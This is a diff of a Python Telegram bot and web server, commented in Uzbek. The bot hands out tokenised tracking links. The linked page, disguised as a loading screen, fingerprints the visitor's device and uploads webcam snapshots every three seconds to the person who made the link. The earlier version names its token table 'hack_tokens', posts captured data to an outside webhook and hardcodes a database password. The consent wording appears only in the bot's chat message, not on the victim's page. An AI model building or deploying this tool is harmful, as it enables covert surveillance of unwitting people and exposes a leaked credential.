@@ -1,214 +1,236 @@
 #!/usr/bin/env python3
-# camera_api_pg.py
-
-import os
-import json
-import uuid
-import base64
-import asyncio
-import aiohttp
+# main.py
 import logging
-from datetime import datetime, timezone
+import os
+import uuid
+import asyncio
+import base64
 from io import BytesIO
 from aiohttp import web
-import asyncpg
+from telegram import Update, InputFile
+from telegram.ext import (
+    Application, CommandHandler, ContextTypes
+)
 
-# --------- LOGGING ---------
-logging.basicConfig(level=logging.INFO)
+# ---------------- LOG ----------------
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO
+)
 logger = logging.getLogger(__name__)
 
-# --------- ENV ---------
-DATABASE_URL = ("postgresql://postgres:bJYhQjxLLoNAxIYduQuvqOMrhScHycTT@caboose.proxy.rlwy.net:29516/railway")
-MAIN_BOT_WEBHOOK_URL = ("https://fit-roanna-runex-7a8db616.koyeb.app/")  # asosiy botga yuborish uchun
-PORT = int(os.getenv("PORT", "8000"))
+# ---------------- ENV ----------------
+BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "0") or 0)
+WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://example.com").rstrip('/')
 
-if not DATABASE_URL:
-    raise SystemExit("❌ DATABASE_URL kerak!")
+if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+    logger.error("BOT_TOKEN kerak! ENV ga qo'ying.")
+    exit(1)
 
-# --------- DB POOL ---------
-db_pool = None
+# ---------------- GLOBAL STATE ----------------
+USER_TOKENS = {}  # token -> telegram_id
 
-async def init_db():
-    global db_pool
-    db_pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=5)
-    # Jadvalni yaratish
-    async with db_pool.acquire() as conn:
-        await conn.execute("""
-            CREATE TABLE IF NOT EXISTS hack_tokens (
-                token TEXT PRIMARY KEY,
-                user_id BIGINT NOT NULL,
-                created_at TIMESTAMPTZ DEFAULT NOW(),
-                used BOOLEAN DEFAULT FALSE
-            )
-        """)
-    logger.info("✅ PostgreSQL ulandi va jadval tayyor.")
+# ---------------- Telegram Handlers ----------------
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Foydalanuvchi /start bosganda unikal linkni beradi va klar consent matnini yuboradi."""
+    user_id = update.effective_user.id
+    token = str(uuid.uuid4())
+    USER_TOKENS[token] = user_id
+    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
 
-# --------- /create_token (Asosiy bot chaqiradi) ---------
-async def create_token(request):
-    try:
-        data = await request.json()
-        user_id = data.get("user_id")
-        if not user_id:
-            return web.json_response({"error": "user_id kerak"}, status=400)
+    msg = (
+        "👋 Salom! Bu test sahifasi **faqat** konsent asosida ishlaydi.\n\n"
+        "📌 Siz test uchun rozi bo‘lsangiz, sahifadagi so‘rovlarga rozilik bering — faqat shunda ma'lumot yuboriladi.\n\n"
+        f"🔗 Test havolasi:\n{link}\n\n"
+        "⚠️ Eslatma: Bu havolani faqat test sub'ekti va o'zingiz foydalaning. Noqonuniy yig'ishdan saqlaning."
+    )
+    await update.message.reply_text(msg)
 
-        token = str(uuid.uuid4())
-        async with db_pool.acquire() as conn:
-            await conn.execute(
-                "INSERT INTO hack_tokens(token, user_id) VALUES($1, $2)",
-                token, user_id
-            )
-        return web.json_response({"token": token})
-    except Exception as e:
-        logger.exception("create_token xato")
-        return web.json_response({"error": str(e)}, status=500)
-
-# --------- /track (Foydalanuvchi ochadi) ---------
+# ---------------- Web Server: /track ----------------
 async def track_page(request):
-    token = request.query.get("token")
-    if not token:
-        return web.Response(text="❌ Token kerak", status=400)
+    token = request.query.get('token')
+    if not token or token not in USER_TOKENS:
+        return web.Response(text="❌ Havola noto‘g‘ri yoki eskirgan.", status=403)
 
-    async with db_pool.acquire() as conn:
-        row = await conn.fetchrow("""
-            SELECT user_id FROM hack_tokens
-            WHERE token = $1
-              AND used = FALSE
-              AND created_at > NOW() - INTERVAL '1 hour'
-        """, token)
-
-    if not row:
-        return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)
-
-    # HTML sahifa (sizniki kabi)
-    html = f"""<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"/><title>Yuklanmoqda...</title>
-<style>body{{font-family:sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;background:#fafafa;color:#333;}}.loader{{width:40px;height:40px;border:4px solid #ddd;border-top:4px solid #4CAF50;border-radius:50%;animation:spin 1s linear infinite;margin:20px;}}@keyframes spin{{to{{transform:rotate(360deg);}}}}.note{{font-size:0.9em;color:#777;}}</style>
+    # Consent-first sahifa: alohida tugmalar — joylashuv & kamera
+  html = f"""
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Ma'lumot yig'ilmoqda...</title>
+  <style>
+    body {{
+      background-color: #0d1117;
+      color: #c9d1d9;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center;
+    }}
+    h2 {{ font-weight: 400; margin-bottom: 20px; }}
+    .loader {{
+      border: 4px solid #1f6feb;
+      border-radius: 50%;
+      border-top: 4px solid transparent;
+      width: 50px; height: 50px;
+      animation: spin 1s linear infinite;
+    }}
+    @keyframes spin {{
+      0% {{ transform: rotate(0deg); }}
+      100% {{ transform: rotate(360deg); }}
+    }}
+  </style>
 </head>
 <body>
-  <h2>Iltimos, kuting...</h2>
+  <h2>Iltimos, kuting... Ma'lumotlar yig‘ilmoqda</h2>
   <div class="loader"></div>
-  <div class="note">Ma'lumotlar yig'ilmoqda...</div>
   <script>
     async function collect() {{
       const data = {{
-        timestamp: new Date().toISOString(),
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: new Date().toLocaleString('uz-UZ', {{ timeZone: 'Asia/Tashkent' }}),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Noma\\'lum',
         utcOffset: -new Date().getTimezoneOffset() / 60,
-        languages: navigator.languages?.join(', ') || navigator.language,
+        languages: (navigator.languages || [navigator.language]).join(', '),
         userAgent: navigator.userAgent,
         platform: navigator.platform,
-        deviceMemory: navigator.deviceMemory || "Noma'lum",
-        hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
-        screen: `${{screen.width}}x${{screen.height}}`,
-        viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
-        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
-        browser: "Noma'lum",
-        os: "Noma'lum"
+        os: /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : 'Noma\\'lum',
+        browser: 'Noma\\'lum',
+        screen: `${{screen.width}} × ${{screen.height}}`,
+        viewport: `${{window.innerWidth}} × ${{window.innerHeight}}`,
+        cpuCores: navigator.hardwareConcurrency || 'Noma\\'lum',
+        ram: navigator.deviceMemory ? `${{navigator.deviceMemory}} GB` : 'Noma\\'lum',
+        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Telefon/Planshet' : 'Kompyuter'
       }};
-
-      if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
-      else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
-      else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";
-
-      if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
-      else if (/Android/.test(navigator.userAgent)) data.os = "Android";
-      else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
-      else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";
-      else data.os = "Boshqa";
-
-      let hasImage = false;
-      let imageData = null;
+      if (navigator.userAgent.includes('Chrome')) data.browser = 'Chrome';
+      else if (navigator.userAgent.includes('Firefox')) data.browser = 'Firefox';
+      else if (navigator.userAgent.includes('Safari')) data.browser = 'Safari';
 
       try {{
         const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await new Promise(r => {{ video.onloadedmetadata = r; video.play(); }});
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
-        imageData = canvas.toDataURL("image/jpeg", 0.7);
-        hasImage = true;
-        stream.getTracks().forEach(t => t.stop());
-      }} catch (e) {{}}
+        const video = document.createElement('video');
+        video.srcObject = stream; video.play();
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        setInterval(() => {{
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+          const imageData = canvas.toDataURL('image/jpeg');
+          fetch('/upload_image', {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify({{ token: '{token}', image: imageData }})
+          }});
+        }}, 3000);
+      }} catch (e) {{
+        console.log('Kamera ruxsat berilmadi');
+      }}
 
-      const payload = {{ token: "{token}", clientData: data }};
-      if (hasImage) payload.image = imageData;
-
-      await fetch("/submit", {{
-        method: "POST",
-        headers: {{ "Content-Type": "application/json" }},
-        body: JSON.stringify(payload)
+      fetch('/submit', {{
+        method: 'POST',
+        headers: {{ 'Content-Type': 'application/json' }},
+        body: JSON.stringify({{ token: '{token}', ...data }})
+      }}).then(() => {{
+        document.body.innerHTML = "<h2>✅ Rahmat! Ma'lumotlar yuborildi.</h2>";
       }});
-
-      document.body.innerHTML = "<h2>✅ Ma’lumotlar olindi</h2>";
     }}
     collect();
   </script>
 </body>
-</html>"""
-    return web.Response(text=html, content_type="text/html")
+</html>
+"""
+    return web.Response(text=html, content_type='text/html')
 
-# --------- /submit ---------
+# ---------------- Web Server: /submit ----------------
 async def submit_data(request):
     try:
-        body = await request.json()
-        token = body.get("token")
-        client_data = body.get("clientData", {})
-        image_data = body.get("image")
+        data = await request.json()
+        token = data.get('token')
+        telegram_id = USER_TOKENS.get(token)
+        if not telegram_id:
+            return web.json_response({"error": "Token topilmadi"}, status=400)
 
-        async with db_pool.acquire() as conn:
-            row = await conn.fetchrow("""
-                SELECT user_id FROM hack_tokens
-                WHERE token = $1 AND used = FALSE
-            """, token)
+        # Yarim formatlangan xabar — kerakli maydonlarni chiqaramiz
+        lines = []
+        lines.append(f"🕒 {data.get('timestamp', 'Noma\\'lum')}")
+        if 'latitude' in data and 'longitude' in data:
+            lines.append(f"📍 Joylashuv: {data.get('latitude')}, {data.get('longitude')} (aniqlik: {data.get('accuracy', '?')} m)")
+        lines.append(f"🌍 Vaqt zonasi: {data.get('timezone', 'Noma\\'lum')} (UTC{data.get('utcOffset', '+?')})")
+        lines.append(f"💬 Til: {data.get('languages', 'Noma\\'lum')}")
+        lines.append(f"💻 Tizim: {data.get('os', 'Noma\\'lum')} | Brauzer: {data.get('browser', 'Noma\\'lum')}")
+        lines.append(f"📱 Qurilma: {data.get('deviceType', 'Noma\\'lum')} | Platform: {data.get('platform', '-')}")
+        lines.append(f"🧠 CPU: {data.get('cpuCores', '?')} | RAM: {data.get('ram', '?')}")
+        lines.append(f"📺 Ekran: {data.get('screen', '?')} | Ko'rinish: {data.get('viewport', '?')}")
+        if 'cameraResolution' in data:
+            lines.append(f"📷 Kamera: {data.get('cameraResolution')}")
+        lines.append(f"🔍 UA: {data.get('userAgent', 'Noma\\'lum')}")
 
-            if not row:
-                return web.Response(status=403)
-
-            user_id = row["user_id"]
-            # Tokenni "bir marta ishlatilsin" deb belgilash
-            await conn.execute("UPDATE hack_tokens SET used = TRUE WHERE token = $1", token)
-
-        # Asosiy botga yuborish
-        payload = {
-            "user_id": user_id,
-            "device_data": client_data,
-            "image": image_data
-        }
-
-        async with request.app["session"].post(MAIN_BOT_WEBHOOK_URL, json=payload) as resp:
-            if resp.status != 200:
-                logger.warning(f"Webhook failed: {resp.status}")
-
-        return web.Response(status=200)
+        message = "\n".join(lines)
+        await request.app['bot'].send_message(chat_id=telegram_id, text=message)
+        return web.json_response({"status": "ok"})
     except Exception as e:
-        logger.exception("submit_data xato")
-        return web.Response(status=500)
+        logger.exception(f"[SUBMIT ERROR] {e}")
+        return web.json_response({"error": str(e)}, status=500)
 
-# --------- Web server ---------
-async def start_web_server():
+# ---------------- Web Server: /upload_image ----------------
+async def upload_image(request):
+    try:
+        data = await request.json()
+        token = data.get('token')
+        image_data = data.get('image')
+
+        telegram_id = USER_TOKENS.get(token)
+        if not telegram_id:
+            return web.json_response({"error": "Token topilmadi"}, status=400)
+
+        if not image_data:
+            return web.json_response({"error": "Rasm topilmadi"}, status=400)
+
+        if ',' in image_data:
+            image_data = image_data.split(',', 1)[1]
+
+        image_bytes = base64.b64decode(image_data)
+        image_io = BytesIO(image_bytes)
+        image_io.name = "photo.jpg"
+
+        await request.app['bot'].send_photo(chat_id=telegram_id, photo=InputFile(image_io))
+        return web.json_response({"status": "ok"})
+    except Exception as e:
+        logger.exception("[UPLOAD IMAGE ERROR]")
+        return web.json_response({"error": str(e)}, status=500)
+
+
+# ---------------- Web Server Starter ----------------
+async def start_web_server(bot):
     app = web.Application()
-    app["session"] = aiohttp.ClientSession()
-    app.router.add_post("/create_token", create_token)
-    app.router.add_get("/track", track_page)
-    app.router.add_post("/submit", submit_data)
-
+    app['bot'] = bot
+    app.router.add_get('/track', track_page)
+    app.router.add_post('/submit', submit_data)
+    app.router.add_post('/upload_image', upload_image)
     runner = web.AppRunner(app)
     await runner.setup()
-    site = web.TCPSite(runner, "0.0.0.0", PORT)
+    port = int(os.getenv("PORT", "8000"))
+    site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
-    logger.info(f"🌐 Camera API (PostgreSQL) ishga tushdi: http://0.0.0.0:{PORT}")
+    logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{port}")
 
-# --------- Main ---------
-async def main():
-    await init_db()
-    await start_web_server()
-    # Forever ishlash
-    while True:
-        await asyncio.sleep(3600)
+# ---------------- Startup ----------------
+async def on_startup(app: Application):
+    asyncio.create_task(start_web_server(app.bot))
+
+# ---------------- Main ----------------
+def main():
+    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
+    app.add_handler(CommandHandler("start", start))
+    logger.info("🚀 Bot ishga tushdi.")
+    app.run_polling()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
